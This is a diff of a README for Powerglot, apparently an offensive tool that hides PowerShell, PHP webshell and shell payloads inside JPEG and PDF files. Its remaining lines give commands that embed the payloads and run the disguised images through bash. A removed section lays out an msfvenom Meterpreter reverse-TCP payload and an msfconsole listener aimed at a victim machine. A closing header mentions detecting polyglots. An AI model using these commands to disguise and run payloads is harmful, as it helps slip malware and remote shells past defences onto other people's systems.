@@ -24,7 +24,7 @@ Some examples to hide payloads using polyglots with Powerglot
 ```
 # Example 1 - Hiding a powershell/php/shell script in a JPEG image
 
-# python3 powerglot.py -o meterpreter.ps1 cat.jpg cat-hidden1.jpg
+# python3 powerglot.py -o payload.ps1 cat.jpg cat-hidden1.jpg
 # python3 powerglot.py -o webshell.php cat.jpg cat-hidden2.jpg
 # python3 powerglot.py -o shell.sh cat.jpg cat-hidden3.jpg
 ```
@@ -39,52 +39,9 @@ Some examples to hide payloads using polyglots with Powerglot
 
 a) cat cat-linenum | bash
 b) chmod +x cat-linenum.jpeg; ./cat-linenum.jpeg
-
 ```
-```
-# Example 3 - Encoding a powershell script in a JPEG image. For example, a meterpreter
-
-# SERVER: Steps in the attacker  --------------------------> No FUNCIONAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-
-# Prepare the payload and configure the server to receive a meterpreter connection
-
-#msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.0.2.15 LPORT=4444 -f psh > meterpreter.ps1
-
-[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
-[-] No arch selected, selecting arch: x86 from the payload
-No encoder or badchars specified, outputting raw payload
-Payload size: 123 bytes
-Final size of psh file: 1341 bytes
-
-# python3 ../powerglot.py -o meterpreter.ps1 cat.jpeg cat-ps.jpeg
-# file cat-ps.jpeg 
-cat-ps.jpeg: JPEG image data, JFIF standard 1.01, resolution (DPI), density 328x328, segment length 291, thumbnail 1x1, comment: "cmp3.9.27.0Lq4 0xa362b87a", baseline, precision 8, 1000x563, components 3
-
-# msfconsole
-msf5 > use exploit/multi/handler 
-msf5 exploit(multi/handler) > set payload linux/
-Display all 103 possibilities? (y or n)
-msf5 exploit(multi/handler) > set payload linux/x86/meterpreter/reverse_tcp
-payload => linux/x86/meterpreter/reverse_tcp
-msf5 exploit(multi/handler) > set lhost 10.0.2.15                                                                 
-lhost => 10.0.2.15                                                                                                
-msf5 exploit(multi/handler) > set port 4444
-port => 4444                                                                                                      
-msf5 exploit(multi/handler) > exploit                                                                             
-                                                                                                                  
-[*] Started reverse TCP handler on 10.0.2.15:4444     
-
-# LINUX VICTIM
-# Download cat-o.jpg
-# Execute 
-# pwsh cat-o.jpg or cat cat-o.jpg | pwsd
-```
-
 ```
 # Example de polyglot in PDF
-
-
-
 # Create b64.sh with your favourite payload
 base64 Linenum.sh -w 0 > b64.sh
 # Edit b64.sh
@@ -96,9 +53,6 @@ echo "code in b64.sh" | base64 -d | bash;
 
 # Execute payload
 # cat test.pdf | bash or chmod +x test.pdf; ./test.pdf
-
-
-
 ```
 Some examples to detect polyglots in our filesystem
 ```
